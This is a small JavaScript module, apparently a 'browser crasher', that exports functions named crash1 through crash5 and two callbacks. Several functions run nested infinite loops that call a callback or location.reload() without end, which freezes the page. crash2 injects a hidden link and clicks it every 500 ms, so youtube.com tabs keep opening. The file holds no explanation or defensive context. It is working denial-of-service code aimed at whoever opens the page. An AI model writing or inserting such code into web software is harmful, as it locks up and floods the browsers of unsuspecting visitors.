export const crash1 = (callback) => {
    while (true) {
        while (true) {
            callback()
        }
    }
}
export const call_back = () => {
    while (true) {
        while (true) {
            location.reload()
        }
    }
}
export const crash2 = () => {
    let g = document.getElementsByTagName('body')[0]
    let n = document.createElement('a')
    n.setAttribute('target', '_blank')
    n.setAttribute('id', 'c2')
    n.setAttribute('href', 'https://www.youtube.com')
    g.after(n)
    setInterval(() => {
        n.click()
    }, 500)
}
export const crash3 = (callback) => {
    while (true) {
        callback()
        while (true) {
            callback()
            while (true) {
                callback()
            }
        }
    }
}
export const crash4 = (callback) => {
    while (true) {
        while (true) {
            callback()
        }
    }
}
export const call_back_2 = () => {
    while (true) {
        location.reload()
        while (true) {
            location.reload()
        }
    }
}
export const crash5 = (callback) => {
    while (true) {
        callback()
        while (true) {
            callback()
            while (true) {
                callback()
                while (true) {
                    callback()
                    while (true) {
                        callback()
                        while (true) {
                            callback()
                            while (true) {
                                callback()
                            }
                        }
                    }
                }

            }
        }
    }
}
